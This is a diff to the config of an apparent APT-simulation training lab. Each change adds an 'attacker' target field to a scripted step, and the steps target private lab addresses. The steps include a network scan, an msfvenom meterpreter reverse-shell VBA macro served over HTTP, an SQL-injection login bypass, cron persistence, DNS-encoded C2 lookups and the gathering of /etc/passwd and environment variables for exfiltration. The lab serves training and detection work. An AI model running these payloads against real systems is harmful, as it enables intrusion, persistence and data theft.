@@ -24,6 +24,7 @@ steps:
   verify:
     type: output_contains
     expect: initial
+  target_vm: attacker
   script: curl -s https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/intrusion-set/intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542.json | python3 -m json.tool | grep -i 'initial access'
   risk_level: low
 - order: 2
@@ -36,6 +37,7 @@ steps:
   verify:
     type: output_contains
     expect: open
+  target_vm: attacker
   script: nmap -sS -sV -O --script=banner -T3 10.20.30.0/24 -oX /tmp/apt_recon.xml
   risk_level: low
 - order: 3
@@ -48,6 +50,7 @@ steps:
   verify:
     type: output_contains
     expect: nikto
+  target_vm: attacker
   script: nikto -h http://10.20.30.80 -output /tmp/nikto_scan.txt -Format txt
   risk_level: low
 - order: 4
@@ -60,6 +63,7 @@ steps:
   verify:
     type: output_contains
     expect: vba
+  target_vm: attacker
   script: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f vba -o /tmp/apt_macro.vba
   risk_level: medium
 - order: 5
@@ -72,6 +76,7 @@ steps:
   verify:
     type: output_contains
     expect: '8888'
+  target_vm: attacker
   script: mkdir -p /tmp/phishing_sim && cp /tmp/apt_macro.vba /tmp/phishing_sim/ && cd /tmp/phishing_sim && python3 -m http.server 8888 --bind 10.20.30.201 > /tmp/phishing_access.log 2>&1 &
   risk_level: medium
 - order: 6
@@ -84,6 +89,7 @@ steps:
   verify:
     type: output_contains
     expect: token
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"test"}'' | python3 -m json.tool'
   risk_level: medium
 - order: 7
@@ -96,6 +102,7 @@ steps:
   verify:
     type: output_contains
     expect: APT_PERSISTENCE
+  target_vm: attacker
   script: echo '*/5 * * * * /bin/bash -c "echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt"' | crontab -
   risk_level: medium
 - order: 8
@@ -108,6 +115,7 @@ steps:
   verify:
     type: output_contains
     expect: QVBU
+  target_vm: attacker
   script: echo 'APT_C2_DATA' | base64 | tr -d '=' | xargs -I{} nslookup {}.test.local 2>&1 | head -5
   risk_level: medium
 - order: 9
@@ -120,6 +128,7 @@ steps:
   verify:
     type: output_contains
     expect: /tmp/apt_exfil.txt
+  target_vm: attacker
   script: cat /etc/passwd > /tmp/apt_exfil.txt && env >> /tmp/apt_exfil.txt && ip addr >> /tmp/apt_exfil.txt && wc -l /tmp/apt_exfil.txt
   risk_level: medium
 - order: 10
@@ -132,6 +141,7 @@ steps:
   verify:
     type: output_contains
     expect: session
+  target_vm: attacker
   script: grep -E '(Failed|Accepted|session opened|session closed|Invalid user)' /var/log/auth.log | tail -30
   risk_level: low
 - order: 11
@@ -144,6 +154,7 @@ steps:
   verify:
     type: output_contains
     expect: alert
+  target_vm: attacker
   script: ssh 10.20.30.1 'grep -rn -i "apt\|c2\|exfil\|cozy\|beacon" /etc/suricata/rules/ 2>/dev/null | head -20'
   risk_level: low
 - order: 12
@@ -164,6 +175,7 @@ steps:
   verify:
     type: output_contains
     expect: enterprise-attack
+  target_vm: attacker
   script: 'cat > /tmp/apt_attack_layer.json << ''EOF''
 
     {"name":"APT Simulation Lab","versions":{"attack":"14","navigator":"4.9","layer":"4.5"},"domain":"enterprise-attack","techniques":[{"techniqueID":"T1595","score":1,"comment":"Active Scanning"},{"techniqueID":"T1566.001","score":1,"comment":"Spearphishing
@@ -212,6 +224,7 @@ steps:
   verify:
     type: output_contains
     expect: Kill Chain Analysis
+  target_vm: attacker
   script: 'crontab -r 2>/dev/null; kill $(lsof -ti:8888) 2>/dev/null; rm -f /tmp/apt_*.txt /tmp/apt_*.vba /tmp/phishing_sim/* 2>/dev/null && cat > /tmp/apt_killchain_report.txt << ''EOF''
 
     === APT Kill Chain Analysis Report ===
